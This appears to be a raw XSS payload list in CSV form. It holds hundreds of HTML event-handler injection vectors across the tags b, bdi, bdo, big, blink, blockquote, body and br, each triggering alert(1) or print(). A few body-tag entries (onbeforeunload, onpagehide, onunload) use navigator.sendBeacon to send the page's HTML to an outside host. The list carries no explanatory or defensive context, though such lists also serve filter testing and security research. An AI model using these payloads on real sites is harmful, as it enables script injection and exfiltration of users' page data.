,,<b id=x tabindex=1 onfocus=alert(1)></b>,,
,,<b id=x tabindex=1 onfocusin=alert(1)></b>,,
,,<b onafterscriptexecute=alert(1)><script>1</script>,,
,,"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",,
,,"<b onbeforecut=""alert(1)"" contenteditable>test</b>",,
,,<b onbeforescriptexecute=alert(1)><script>1</script>,,
,,<b onblur=alert(1) id=x tabindex=1 style=display:block>test</b><input value=clickme>,,
,,"<b onclick=""alert(1)"" style=display:block>test</b>",,
,,"<b oncontextmenu=""alert(1)"" style=display:block>test</b>",,
,,"<b oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<b oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<b ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</b>",,
,,<b onfocus=alert(1) autofocus tabindex=1>,,
,,<b onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</b><input value=clickme>,,
,,"<b onkeydown=""alert(1)"" contenteditable style=display:block>test</b>",,
,,"<b onkeypress=""alert(1)"" contenteditable style=display:block>test</b>",,
,,"<b onkeyup=""alert(1)"" contenteditable style=display:block>test</b>",,
,,"<b onmousedown=""alert(1)"" style=display:block>test</b>",,
,,"<b onmouseenter=""alert(1)"" style=display:block>test</b>",,
,,"<b onmouseleave=""alert(1)"" style=display:block>test</b>",,
,,"<b onmousemove=""alert(1)"" style=display:block>test</b>",,
,,"<b onmouseout=""alert(1)"" style=display:block>test</b>",,
,,"<b onmouseover=""alert(1)"" style=display:block>test</b>",,
,,"<b onmouseup=""alert(1)"" style=display:block>test</b>",,
,,<b onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<b onpaste=""alert(1)"" contenteditable>test</b>",,
,,<b onpointercancel=alert(1)>XSS</b>,,
,,<b onpointerdown=alert(1) style=display:block>XSS</b>,,
,,<b onpointerenter=alert(1) style=display:block>XSS</b>,,
,,<b onpointerleave=alert(1) style=display:block>XSS</b>,,
,,<b onpointermove=alert(1) style=display:block>XSS</b>,,
,,<b onpointerout=alert(1) style=display:block>XSS</b>,,
,,<b onpointerover=alert(1) style=display:block>XSS</b>,,
,,<b onpointerrawupdate=alert(1) style=display:block>XSS</b>,,
,,<b onpointerup=alert(1) style=display:block>XSS</b>,,
,,"<b onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></b>",,
,,<b onwebkitmouseforcechanged=alert(1)>XSS</b>,,
,,<b onwebkitmouseforcedown=alert(1)>XSS</b>,,
,,<b onwebkitmouseforceup=alert(1)>XSS</b>,,
,,<b onwebkitmouseforcewillbegin=alert(1)>XSS</b>,,
,,<b onwebkitwillrevealbottom=alert(1)>XSS</b>,,
,,<bdi contenteditable onbeforeinput=alert(1)>test,,
,,"<bdi draggable=""true"" ondrag=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi draggable=""true"" ondragend=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></bdi>",,
,,<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,,
,,<bdi id=x tabindex=1 onfocusin=alert(1)></bdi>,,
,,<bdi onafterscriptexecute=alert(1)><script>1</script>,,
,,"<bdi onbeforecopy=""alert(1)"" contenteditable>test</bdi>",,
,,"<bdi onbeforecut=""alert(1)"" contenteditable>test</bdi>",,
,,<bdi onbeforescriptexecute=alert(1)><script>1</script>,,
,,<bdi onblur=alert(1) id=x tabindex=1 style=display:block>test</bdi><input value=clickme>,,
,,"<bdi onclick=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi oncontextmenu=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<bdi oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<bdi ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</bdi>",,
,,<bdi onfocus=alert(1) autofocus tabindex=1>,,
,,<bdi onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</bdi><input value=clickme>,,
,,"<bdi onkeydown=""alert(1)"" contenteditable style=display:block>test</bdi>",,
,,"<bdi onkeypress=""alert(1)"" contenteditable style=display:block>test</bdi>",,
,,"<bdi onkeyup=""alert(1)"" contenteditable style=display:block>test</bdi>",,
,,"<bdi onmousedown=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmouseenter=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmouseleave=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmousemove=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmouseout=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmouseover=""alert(1)"" style=display:block>test</bdi>",,
,,"<bdi onmouseup=""alert(1)"" style=display:block>test</bdi>",,
,,<bdi onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<bdi onpaste=""alert(1)"" contenteditable>test</bdi>",,
,,<bdi onpointercancel=alert(1)>XSS</bdi>,,
,,<bdi onpointerdown=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerenter=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerleave=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointermove=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerout=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerover=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerrawupdate=alert(1) style=display:block>XSS</bdi>,,
,,<bdi onpointerup=alert(1) style=display:block>XSS</bdi>,,
,,"<bdi onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></bdi>",,
,,<bdi onwebkitmouseforcechanged=alert(1)>XSS</bdi>,,
,,<bdi onwebkitmouseforcedown=alert(1)>XSS</bdi>,,
,,<bdi onwebkitmouseforceup=alert(1)>XSS</bdi>,,
,,<bdi onwebkitmouseforcewillbegin=alert(1)>XSS</bdi>,,
,,<bdi onwebkitwillrevealbottom=alert(1)>XSS</bdi>,,
,,<bdo contenteditable onbeforeinput=alert(1)>test,,
,,"<bdo draggable=""true"" ondrag=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo draggable=""true"" ondragend=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></bdo>",,
,,<bdo id=x tabindex=1 onfocus=alert(1)></bdo>,,
,,<bdo id=x tabindex=1 onfocusin=alert(1)></bdo>,,
,,<bdo onafterscriptexecute=alert(1)><script>1</script>,,
,,"<bdo onbeforecopy=""alert(1)"" contenteditable>test</bdo>",,
,,"<bdo onbeforecut=""alert(1)"" contenteditable>test</bdo>",,
,,<bdo onbeforescriptexecute=alert(1)><script>1</script>,,
,,<bdo onblur=alert(1) id=x tabindex=1 style=display:block>test</bdo><input value=clickme>,,
,,"<bdo onclick=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo oncontextmenu=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<bdo oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<bdo ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</bdo>",,
,,<bdo onfocus=alert(1) autofocus tabindex=1>,,
,,<bdo onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</bdo><input value=clickme>,,
,,"<bdo onkeydown=""alert(1)"" contenteditable style=display:block>test</bdo>",,
,,"<bdo onkeypress=""alert(1)"" contenteditable style=display:block>test</bdo>",,
,,"<bdo onkeyup=""alert(1)"" contenteditable style=display:block>test</bdo>",,
,,"<bdo onmousedown=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmouseenter=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmouseleave=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmousemove=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmouseout=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmouseover=""alert(1)"" style=display:block>test</bdo>",,
,,"<bdo onmouseup=""alert(1)"" style=display:block>test</bdo>",,
,,<bdo onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<bdo onpaste=""alert(1)"" contenteditable>test</bdo>",,
,,<bdo onpointercancel=alert(1)>XSS</bdo>,,
,,<bdo onpointerdown=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerenter=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerleave=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointermove=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerout=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerover=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerrawupdate=alert(1) style=display:block>XSS</bdo>,,
,,<bdo onpointerup=alert(1) style=display:block>XSS</bdo>,,
,,"<bdo onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></bdo>",,
,,<bdo onwebkitmouseforcechanged=alert(1)>XSS</bdo>,,
,,<bdo onwebkitmouseforcedown=alert(1)>XSS</bdo>,,
,,<bdo onwebkitmouseforceup=alert(1)>XSS</bdo>,,
,,<bdo onwebkitmouseforcewillbegin=alert(1)>XSS</bdo>,,
,,<bdo onwebkitwillrevealbottom=alert(1)>XSS</bdo>,,
,,<big contenteditable onbeforeinput=alert(1)>test,,
,,"<big draggable=""true"" ondrag=""alert(1)"" style=display:block>test</big>",,
,,"<big draggable=""true"" ondragend=""alert(1)"" style=display:block>test</big>",,
,,"<big draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</big>",,
,,"<big draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</big>",,
,,"<big draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</big>",,
,,"<big draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</big>",,
,,"<big id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></big>",,
,,<big id=x tabindex=1 onfocus=alert(1)></big>,,
,,<big id=x tabindex=1 onfocusin=alert(1)></big>,,
,,<big onafterscriptexecute=alert(1)><script>1</script>,,
,,"<big onbeforecopy=""alert(1)"" contenteditable>test</big>",,
,,"<big onbeforecut=""alert(1)"" contenteditable>test</big>",,
,,<big onbeforescriptexecute=alert(1)><script>1</script>,,
,,<big onblur=alert(1) id=x tabindex=1 style=display:block>test</big><input value=clickme>,,
,,"<big onclick=""alert(1)"" style=display:block>test</big>",,
,,"<big oncontextmenu=""alert(1)"" style=display:block>test</big>",,
,,"<big oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<big oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<big ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</big>",,
,,<big onfocus=alert(1) autofocus tabindex=1>,,
,,<big onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</big><input value=clickme>,,
,,"<big onkeydown=""alert(1)"" contenteditable style=display:block>test</big>",,
,,"<big onkeypress=""alert(1)"" contenteditable style=display:block>test</big>",,
,,"<big onkeyup=""alert(1)"" contenteditable style=display:block>test</big>",,
,,"<big onmousedown=""alert(1)"" style=display:block>test</big>",,
,,"<big onmouseenter=""alert(1)"" style=display:block>test</big>",,
,,"<big onmouseleave=""alert(1)"" style=display:block>test</big>",,
,,"<big onmousemove=""alert(1)"" style=display:block>test</big>",,
,,"<big onmouseout=""alert(1)"" style=display:block>test</big>",,
,,"<big onmouseover=""alert(1)"" style=display:block>test</big>",,
,,"<big onmouseup=""alert(1)"" style=display:block>test</big>",,
,,<big onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<big onpaste=""alert(1)"" contenteditable>test</big>",,
,,<big onpointercancel=alert(1)>XSS</big>,,
,,<big onpointerdown=alert(1) style=display:block>XSS</big>,,
,,<big onpointerenter=alert(1) style=display:block>XSS</big>,,
,,<big onpointerleave=alert(1) style=display:block>XSS</big>,,
,,<big onpointermove=alert(1) style=display:block>XSS</big>,,
,,<big onpointerout=alert(1) style=display:block>XSS</big>,,
,,<big onpointerover=alert(1) style=display:block>XSS</big>,,
,,<big onpointerrawupdate=alert(1) style=display:block>XSS</big>,,
,,<big onpointerup=alert(1) style=display:block>XSS</big>,,
,,"<big onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></big>",,
,,<big onwebkitmouseforcechanged=alert(1)>XSS</big>,,
,,<big onwebkitmouseforcedown=alert(1)>XSS</big>,,
,,<big onwebkitmouseforceup=alert(1)>XSS</big>,,
,,<big onwebkitmouseforcewillbegin=alert(1)>XSS</big>,,
,,<big onwebkitwillrevealbottom=alert(1)>XSS</big>,,
,,<blink contenteditable onbeforeinput=alert(1)>test,,
,,"<blink draggable=""true"" ondrag=""alert(1)"" style=display:block>test</blink>",,
,,"<blink draggable=""true"" ondragend=""alert(1)"" style=display:block>test</blink>",,
,,"<blink draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</blink>",,
,,"<blink draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</blink>",,
,,"<blink draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</blink>",,
,,"<blink draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</blink>",,
,,"<blink id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></blink>",,
,,<blink id=x tabindex=1 onfocus=alert(1)></blink>,,
,,<blink id=x tabindex=1 onfocusin=alert(1)></blink>,,
,,<blink onafterscriptexecute=alert(1)><script>1</script>,,
,,"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",,
,,"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",,
,,<blink onbeforescriptexecute=alert(1)><script>1</script>,,
,,<blink onblur=alert(1) id=x tabindex=1 style=display:block>test</blink><input value=clickme>,,
,,"<blink onclick=""alert(1)"" style=display:block>test</blink>",,
,,"<blink oncontextmenu=""alert(1)"" style=display:block>test</blink>",,
,,"<blink oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<blink oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<blink ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</blink>",,
,,<blink onfocus=alert(1) autofocus tabindex=1>,,
,,<blink onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blink><input value=clickme>,,
,,"<blink onkeydown=""alert(1)"" contenteditable style=display:block>test</blink>",,
,,"<blink onkeypress=""alert(1)"" contenteditable style=display:block>test</blink>",,
,,"<blink onkeyup=""alert(1)"" contenteditable style=display:block>test</blink>",,
,,"<blink onmousedown=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmouseenter=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmouseleave=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmousemove=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmouseout=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmouseover=""alert(1)"" style=display:block>test</blink>",,
,,"<blink onmouseup=""alert(1)"" style=display:block>test</blink>",,
,,<blink onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<blink onpaste=""alert(1)"" contenteditable>test</blink>",,
,,<blink onpointercancel=alert(1)>XSS</blink>,,
,,<blink onpointerdown=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerenter=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerleave=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointermove=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerout=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerover=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerrawupdate=alert(1) style=display:block>XSS</blink>,,
,,<blink onpointerup=alert(1) style=display:block>XSS</blink>,,
,,"<blink onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blink>",,
,,<blink onwebkitmouseforcechanged=alert(1)>XSS</blink>,,
,,<blink onwebkitmouseforcedown=alert(1)>XSS</blink>,,
,,<blink onwebkitmouseforceup=alert(1)>XSS</blink>,,
,,<blink onwebkitmouseforcewillbegin=alert(1)>XSS</blink>,,
,,<blink onwebkitwillrevealbottom=alert(1)>XSS</blink>,,
,,<blockquote contenteditable onbeforeinput=alert(1)>test,,
,,"<blockquote draggable=""true"" ondrag=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote draggable=""true"" ondragend=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></blockquote>",,
,,<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,,
,,<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,,
,,<blockquote onafterscriptexecute=alert(1)><script>1</script>,,
,,"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>",,
,,"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",,
,,<blockquote onbeforescriptexecute=alert(1)><script>1</script>,,
,,<blockquote onblur=alert(1) id=x tabindex=1 style=display:block>test</blockquote><input value=clickme>,,
,,"<blockquote onclick=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote oncontextmenu=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<blockquote oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<blockquote ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</blockquote>",,
,,<blockquote onfocus=alert(1) autofocus tabindex=1>,,
,,<blockquote onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</blockquote><input value=clickme>,,
,,"<blockquote onkeydown=""alert(1)"" contenteditable style=display:block>test</blockquote>",,
,,"<blockquote onkeypress=""alert(1)"" contenteditable style=display:block>test</blockquote>",,
,,"<blockquote onkeyup=""alert(1)"" contenteditable style=display:block>test</blockquote>",,
,,"<blockquote onmousedown=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmouseenter=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmouseleave=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmousemove=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmouseout=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmouseover=""alert(1)"" style=display:block>test</blockquote>",,
,,"<blockquote onmouseup=""alert(1)"" style=display:block>test</blockquote>",,
,,<blockquote onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",,
,,<blockquote onpointercancel=alert(1)>XSS</blockquote>,,
,,<blockquote onpointerdown=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerenter=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerleave=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointermove=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerout=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerover=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerrawupdate=alert(1) style=display:block>XSS</blockquote>,,
,,<blockquote onpointerup=alert(1) style=display:block>XSS</blockquote>,,
,,"<blockquote onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></blockquote>",,
,,<blockquote onwebkitmouseforcechanged=alert(1)>XSS</blockquote>,,
,,<blockquote onwebkitmouseforcedown=alert(1)>XSS</blockquote>,,
,,<blockquote onwebkitmouseforceup=alert(1)>XSS</blockquote>,,
,,<blockquote onwebkitmouseforcewillbegin=alert(1)>XSS</blockquote>,,
,,<blockquote onwebkitwillrevealbottom=alert(1)>XSS</blockquote>,,
,,<body contenteditable onbeforeinput=alert(1)>test,,
,,"<body draggable=""true"" ondrag=""alert(1)"" style=display:block>test</body>",,
,,"<body draggable=""true"" ondragend=""alert(1)"" style=display:block>test</body>",,
,,"<body draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</body>",,
,,"<body draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</body>",,
,,"<body draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</body>",,
,,"<body draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</body>",,
,,"<body id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></body>",,
,,<body id=x tabindex=1 onfocus=alert(1)></body>,,
,,<body id=x tabindex=1 onfocusin=alert(1)></body>,,
,,<body onafterprint=alert(1)>,,
,,<body onafterscriptexecute=alert(1)><script>1</script>,,
,,"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",,
,,"<body onbeforecut=""alert(1)"" contenteditable>test</body>",,
,,<body onbeforeprint=console.log(1)>,,
,,<body onbeforescriptexecute=alert(1)><script>1</script>,,
,,"<body onbeforeunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",,
,,<body onblur=alert(1) id=x tabindex=1 style=display:block>test</body><input value=clickme>,,
,,"<body onclick=""alert(1)"" style=display:block>test</body>",,
,,"<body oncontextmenu=""alert(1)"" style=display:block>test</body>",,
,,"<body oncopy=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<body oncut=alert(1) value=""XSS"" autofocus tabindex=1 style=display:block>test",,
,,"<body ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>test</body>",,
,,<body onerror=alert(1) onload=/>,,
,,<body onfocus=alert(1) autofocus tabindex=1>,,
,,<body onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</body><input value=clickme>,,
,,"<body onhashchange=""print()"">",,
,,"<body onkeydown=""alert(1)"" contenteditable style=display:block>test</body>",,
,,"<body onkeypress=""alert(1)"" contenteditable style=display:block>test</body>",,
,,"<body onkeyup=""alert(1)"" contenteditable style=display:block>test</body>",,
,,<body onload=alert(1)>,,
,,<body onmessage=print()>,,
,,"<body onmousedown=""alert(1)"" style=display:block>test</body>",,
,,"<body onmouseenter=""alert(1)"" style=display:block>test</body>",,
,,"<body onmouseleave=""alert(1)"" style=display:block>test</body>",,
,,"<body onmousemove=""alert(1)"" style=display:block>test</body>",,
,,"<body onmouseout=""alert(1)"" style=display:block>test</body>",,
,,"<body onmouseover=""alert(1)"" style=display:block>test</body>",,
,,"<body onmouseup=""alert(1)"" style=display:block>test</body>",,
,,<body onmousewheel=alert(1) style=display:block>requires scrolling,,
,,"<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",,
,,<body onpageshow=alert(1)>,,
,,"<body onpaste=""alert(1)"" contenteditable>test</body>",,
,,<body onpointercancel=alert(1)>XSS</body>,,
,,<body onpointerdown=alert(1) style=display:block>XSS</body>,,
,,<body onpointerenter=alert(1) style=display:block>XSS</body>,,
,,<body onpointerleave=alert(1) style=display:block>XSS</body>,,
,,<body onpointermove=alert(1) style=display:block>XSS</body>,,
,,<body onpointerout=alert(1) style=display:block>XSS</body>,,
,,<body onpointerover=alert(1) style=display:block>XSS</body>,,
,,<body onpointerrawupdate=alert(1) style=display:block>XSS</body>,,
,,<body onpointerup=alert(1) style=display:block>XSS</body>,,
,,<body onpopstate=print()>,,
,,"<body onresize=""print()"">",,
,,<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,,
,,"<body onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></body>",,
,,<body onselectionchange=alert(1)>select some text,,
,,<body onselectstart=alert(1)>select some text,,
,,<body ontouchend=alert(1)> ,,
,,<body ontouchmove=alert(1)> ,,
,,<body ontouchstart=alert(1)> ,,
,,<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,,
,,"<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>",,
,,<body onwebkitmouseforcechanged=alert(1)>XSS</body>,,
,,<body onwebkitmouseforcedown=alert(1)>XSS</body>,,
,,<body onwebkitmouseforceup=alert(1)>XSS</body>,,
,,<body onwebkitmouseforcewillbegin=alert(1)>XSS</body>,,
,,<body onwebkitwillrevealbottom=alert(1)>XSS</body>,,
,,<body onwheel=alert(1)>,,
,,<br contenteditable onbeforeinput=alert(1)>test,,
,,"<br draggable=""true"" ondrag=""alert(1)"" style=display:block>test</br>",,
,,"<br draggable=""true"" ondragend=""alert(1)"" style=display:block>test</br>",,
,,"<br draggable=""true"" ondragenter=""alert(1)"" style=display:block>test</br>",,
,,"<br draggable=""true"" ondragexit=""alert(1)"" style=display:block>test</br>",,
,,"<br draggable=""true"" ondragleave=""alert(1)"" style=display:block>test</br>",,
,,"<br draggable=""true"" ondragstart=""alert(1)"" style=display:block>test</br>",,
,,"<br id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></br>",,
,,<br id=x tabindex=1 onfocus=alert(1)></br>,,
,,<br id=x tabindex=1 onfocusin=alert(1)></br>,,
,,<br onafterscriptexecute=alert(1)><script>1</script>,,
,,"<br onbeforecopy=""alert(1)"" contenteditable>test</br>",,
,,"<br onbeforecut=""alert(1)"" contenteditable>test</br>",,
,,<br onbeforescriptexecute=alert(1)><script>1</script>,,
,,<br onblur=alert(1) id=x tabindex=1 style=display:block>test</br><input value=clickme>,,
,,"<br onclick=""alert(1)"" style=display:block>test</br>",,
,,"<br oncontextmenu=""alert(1)"" style=display:block>test</br>",,
